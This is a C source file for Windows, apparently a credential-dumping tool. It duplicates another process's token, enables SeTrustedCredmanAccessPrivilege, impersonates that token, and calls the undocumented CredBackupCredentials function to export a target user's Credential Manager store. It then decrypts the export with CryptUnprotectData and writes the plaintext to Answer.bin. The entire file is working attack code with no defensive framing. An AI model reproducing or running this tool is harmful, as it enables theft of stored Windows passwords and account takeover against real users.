#include "windows.h"
#include "stdio.h"
#pragma comment(lib, "Crypt32.lib")

BOOL EnableSeTrustedCredAccessPriv(HANDLE hToken) {
	LUID luid;

	if (!LookupPrivilegeValue(NULL, SE_TRUSTED_CREDMAN_ACCESS_NAME, &luid)) {
		printf(" - Lookup SE_TRUSTED_CREDMAN_ACCESS_NAME FAILED... %#x\n", GetLastError());
		return FALSE;
	}
	TOKEN_PRIVILEGES tokenPriv;
	tokenPriv.PrivilegeCount = 1;
	tokenPriv.Privileges[0].Luid = luid;
	tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(tokenPriv), NULL, NULL)) {
		printf(" - Adjust Token Privileges FAILED... %#x\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

/*
	DumpCred_TrustedTokenPriv.exe dupTargetPID PasswdWritePath [userProcPID]
	需要有存储的凭据，控制面板 -> 凭据管理器
*/
INT wmain(INT argc, WCHAR* argv[]) {

	if (argc < 3) {
		printf(" - 使用方法：DumpCred_TrustedTokenPriv.exe dupTargetPID PasswdWritePath [userProcPID]\n");
		return 1;
	}

	DWORD dupTargetPID = 0, userProcPID = 0, dFilesizeHign = 0, dFilesizeLow = 0, bytesIO = 0;
	HANDLE hDupProc = NULL, hOriginToken = NULL, hImpersonToken = NULL, hTargetUserToken = NULL, hUserProc = NULL, hBakF = NULL;
	DATA_BLOB data_in, data_out;
	LPWSTR pDescrOut = NULL;

	typedef BOOL (WINAPI * f_CredBackupCredentials)(HANDLE Token, LPCWSTR Path, PVOID Password, DWORD PasswordSize, DWORD Flags);


	if (4 == argc) userProcPID = _wtoi(argv[3]);

	// get func address fCredBackupCredentials
	HMODULE hLib = LoadLibrary(L"advapi32.dll");
	f_CredBackupCredentials fCredBackupCredentials = (f_CredBackupCredentials)GetProcAddress(hLib, "CredBackupCredentials");
	if (NULL == fCredBackupCredentials) {
		printf(" - GetProcAddress fCredBackupCredentials FAILED...%#x\n", GetLastError());
		return 1;
	}else printf(" - GetProcAddress fCredBackupCredentials : %#x\n", (DWORD)fCredBackupCredentials);

	if (0 == (dupTargetPID = _wtoi(argv[1]))) {
		printf(" - Get dupTargetPID FAILED...%#x\n", GetLastError());
		return 1;
	}else printf(" - Get dupTargetPID : %#x\n", dupTargetPID);
	
	do {
		// Open process
		if (NULL == (hDupProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, dupTargetPID))) {
			printf(" - Open Target Process HANDLE FAILED...%#x\n", GetLastError());
			break;
		}
		else printf(" - Open Target Process HANDLE : %#x\n", hDupProc);

		// open process Token
		if (!OpenProcessToken(hDupProc, TOKEN_DUPLICATE, &hOriginToken) || !hOriginToken) {
			printf(" - Open Target Process Token FAILED...%#x\n", GetLastError());
			break;
		}
		else printf(" - Open Target Process Token : %#x\n", hOriginToken);

		// duplicate Token to impersonation Token
		if (!DuplicateTokenEx(hOriginToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
			TokenPrimary, &hImpersonToken) || !hImpersonToken) {
			printf(" - Duplicate Token FAILED...%#x\n", GetLastError());
			break;
		}
		else printf(" - Duplicate Token : %#x\n", hImpersonToken);

		// enable SeTrustedCredmanAccessPrivilege
		if (!EnableSeTrustedCredAccessPriv(hImpersonToken))
			break;

		// impersonate
		if (!ImpersonateLoggedOnUser(hImpersonToken)) {
			printf(" - ImpersonateLoggedOnUser FAILED...%#x\n", GetLastError());
			break;
		}
		else printf(" - ImpersonateLoggedOnUser SUCCEED\n");

		// Open User Process
		if (!(hUserProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (!userProcPID ? GetCurrentProcessId() : userProcPID)))) {
			printf(" - Open User Process FAILED...%#x\n", GetLastError());
			break;
		}
		else printf(" - Open User Process PID %d : %#x\n", (!userProcPID ? GetCurrentProcessId() : userProcPID),hUserProc);

		// open target user token
		if (!OpenProcessToken(hUserProc, TOKEN_ALL_ACCESS, &hTargetUserToken) || !hTargetUserToken) {
			printf(" - Open User Process Token FAILED...%#x\n", GetLastError());
			break;
		}
		else printf(" - Open User Process Token : %#x\n", hTargetUserToken);

		// Call CredBackupCredentials with NULL passwd
		if (!fCredBackupCredentials(hTargetUserToken, argv[2], NULL, NULL, NULL)) {
			printf(" - Credential Backup FAILED...%#x\n", GetLastError());
			break;
		}
		else printf(" - Credential Backup SUCCEED\n");

		// read protected data from backup file
		if (INVALID_HANDLE_VALUE == (hBakF = CreateFile(argv[2], GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0))) {
			printf(" - Open Backup File FAILED...%#x\n", GetLastError());
			break;
		}
		else printf(" - Open Backup File SUCCEED\n");
		if (INVALID_FILE_SIZE == (dFilesizeLow = GetFileSize(hBakF, &dFilesizeHign))) {
			printf(" - Get Backup File size FAILED...%#x\n", GetLastError());
		}
		else {
			if (!(data_in.pbData = (byte*)LocalAlloc(LPTR, dFilesizeLow + 0x10))){// (GetProcessHeap(), HEAP_ZERO_MEMORY, dFilesize + 0x100))) {
				printf(" - Alloc Heap FAILED...%#x\n", GetLastError());
			}
			else {
				data_in.cbData = dFilesizeLow;
				if (!ReadFile(hBakF, data_in.pbData, data_in.cbData, &bytesIO, NULL)) {
					printf(" - Read File FAILED...%#x\n", GetLastError());
				}
				else {
					// decrypt data
					if (!CryptUnprotectData(&data_in, &pDescrOut, NULL, NULL, NULL, 0, &data_out)) {
						printf(" - Backup File Decrypt FAILED...%#x\n", GetLastError());
					}
					else {
						
						HANDLE fAns = CreateFile(L"Answer.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
						if (!WriteFile(fAns, data_out.pbData, data_out.cbData, &bytesIO, NULL)) {
							printf(" - Write Answer File FAILED...%#x\n", GetLastError());
						}
						else printf(" - Write Answer File SUCCEED :)\n");
					}
				}
			}
			LocalFree(data_in.pbData);
			LocalFree(data_out.pbData);
			data_out = data_in = { 0 };
			dFilesizeLow = dFilesizeHign = 0;
		}

		// revert to self
		RevertToSelf();
	} while (FALSE);
	
	getchar();

	if (hDupProc) CloseHandle(hDupProc);
	if (hOriginToken) CloseHandle(hOriginToken);
	if (hImpersonToken) CloseHandle(hImpersonToken);
	if (hUserProc) CloseHandle(hUserProc);
	if (hTargetUserToken) CloseHandle(hTargetUserToken);
	if (hBakF) CloseHandle(hBakF);
	return 0;
}
